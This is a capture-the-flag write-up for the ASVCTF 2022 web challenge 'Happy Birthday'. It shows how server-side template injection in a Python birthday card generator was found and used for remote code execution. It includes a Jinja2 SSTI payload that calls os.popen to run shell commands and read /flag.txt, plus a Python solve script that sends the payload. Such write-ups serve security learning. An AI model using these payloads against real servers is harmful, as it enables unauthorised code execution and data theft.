# ASVCTF 2022 - Happy Birthday Writeup
- Type - Web
- Name - Happy Birthday
- Points - 300

## Description
```markdown
Cowabunga dudes and dudettes. 

Michelangelo here, and I've built you a Birthday Card Generator from me and my brothers! Donnie says I need to secure it, but I think it's the coolest thing since sliced pizza.

Party On!
```

## Writeup
When you navigate to a hosted instance, all you see is a very simple page:

<img src="site.png" width="500px">

Any input you place is shown on the page (such as the value `test`, seen below). Note that XSS payloads don't work since the `<` and `>` characters are properly escaped. 

<img src="test.png" width="500px">

At this point, it wasn't clear if the input was going through any sort of server-side check, or if the vulnerability was present elsewhere, but I tried a [Server-Side Template Injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) (SSTI) payload anyway. The most simple payload to test is `{{7*7}}`, and if you see `49` as the result instead of `{{7*7}}`, then you know that the values inside are being processed as code. After trying this, I saw the value `Happy Birthday 49!` reflected, meaning it *was* vulnerable to SSTI!

A quick check of the response headers showed the `Server` set to `Werkzeug/1.0.1 Python/2.7.14`, meaning we had to use a Python SSTI payload to get RCE. I copied a [simple RCE payload from the internet](https://secure-cookie.io/attacks/ssti/#tldr---show-me-the-fun-part) (`{{"foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("ls").read()}}`) to run my code and get the output. After a little looking around, I found that the flag was stored in `/`, so the command `cat /flag.txt` worked!

### Solve Script
Here is my [automated exploit](solve.py) in Python:

```python
import requests
from urllib.parse import urlencode
from bs4 import BeautifulSoup

# define SSTI payload
payload = urlencode({
        "name": "{{'foo'.__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen('cat /flag.txt').read()}}"
    })

# send request and get result
result = requests.request("POST", "http://193.57.159.27:47715/", data=payload, headers={'Content-Type': 'application/x-www-form-urlencoded'})

# parse result for flag
html = BeautifulSoup(result.text, "html.parser")
flag = html.find_all("h1")[0].text
print(flag)
```

**Flag:** `ASV{f31d34e2b726b385741db15fec005661}`